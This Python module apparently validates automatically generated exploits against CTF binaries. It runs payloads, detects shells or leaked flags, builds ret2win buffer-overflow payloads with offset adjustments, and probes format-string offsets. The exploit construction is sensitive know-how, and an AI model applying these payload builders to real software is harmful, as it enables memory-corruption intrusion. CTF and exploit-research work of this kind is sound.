"""
validator.py — Run generated payloads against the binary and report results.

Returns a verdict: shell, flag_leaked, win_hit, crash, clean_exit, timeout.
"""
from __future__ import annotations

import os
import subprocess
import struct


def validate_payload(binary_path: str, payload_bytes: bytes,
                     prompt: str | None = None,
                     timeout: int = 3) -> dict:
    """Run the binary with the payload and return what happened.

    Returns
    -------
    dict with keys:
        status : str
            One of: 'shell', 'flag_leaked', 'clean_exit', 'crash',
                    'abort', 'timeout', 'error'
        returncode : int | None
        output : str  (first 500 chars of stdout)
    """
    if not os.path.isfile(binary_path):
        return {"status": "error", "returncode": None, "output": "binary not found"}

    try:
        proc = subprocess.run(
            [binary_path],
            input=payload_bytes,
            capture_output=True,
            timeout=timeout,
        )
        rc = proc.returncode
        stdout = proc.stdout.decode("utf-8", errors="replace")[:500]
        stderr = proc.stderr.decode("utf-8", errors="replace")[:200]
        combined = stdout + stderr

        # Check for flag strings
        low = combined.lower()
        if any(m in low for m in ["flag{", "ctf{", "picoctf{", "htb{"]):
            return {"status": "flag_leaked", "returncode": rc, "output": stdout}

        # Check for shell indicators
        if any(m in combined for m in ["$ ", "# ", "sh-", "/bin/sh", "/bin/bash"]):
            return {"status": "shell", "returncode": rc, "output": stdout}

        # Check exit status
        if rc == 0:
            return {"status": "clean_exit", "returncode": 0, "output": stdout}
        elif rc == -11:
            return {"status": "crash", "returncode": -11, "output": "SIGSEGV"}
        elif rc == -6:
            return {"status": "abort", "returncode": -6, "output": "SIGABRT"}
        else:
            return {"status": f"exit_{rc}", "returncode": rc, "output": stdout}

    except subprocess.TimeoutExpired:
        return {"status": "timeout", "returncode": None, "output": ""}
    except Exception as e:
        return {"status": "error", "returncode": None, "output": str(e)[:200]}


def validate_ret2win(binary_path: str, offset: int, win_addr: int,
                     bits: int = 64, prompt: str | None = None) -> dict:
    """Build a ret2win payload from confirmed values and validate it."""
    pack = struct.pack
    fmt = "<Q" if bits == 64 else "<I"

    payload = b"A" * offset + pack(fmt, win_addr)

    result = validate_payload(binary_path, payload, prompt=prompt)

    # If it crashes, the offset might need alignment fix (+1 ret gadget)
    if result["status"] == "crash" and bits == 64:
        # Try with a ret-sled (offset might be off by 8 for alignment)
        for adj in [8, -8]:
            alt_payload = b"A" * (offset + adj) + pack(fmt, win_addr)
            alt = validate_payload(binary_path, alt_payload, prompt=prompt)
            if alt["status"] in ("shell", "flag_leaked", "clean_exit"):
                result = alt
                result["adjusted_offset"] = offset + adj
                break

    return result


def validate_fmt_write(binary_path: str, fmt_offset: int,
                       prompt: str | None = None) -> dict:
    """Quick check: does %N$n cause a crash? (confirms write primitive)."""
    # Just test if %N$p leaks our marker — non-destructive
    payload = b"AAAA" + f"%{fmt_offset}$p\n".encode()
    result = validate_payload(binary_path, payload, prompt=prompt)
    if "41414141" in result.get("output", "").lower():
        result["status"] = "confirmed"
    return result
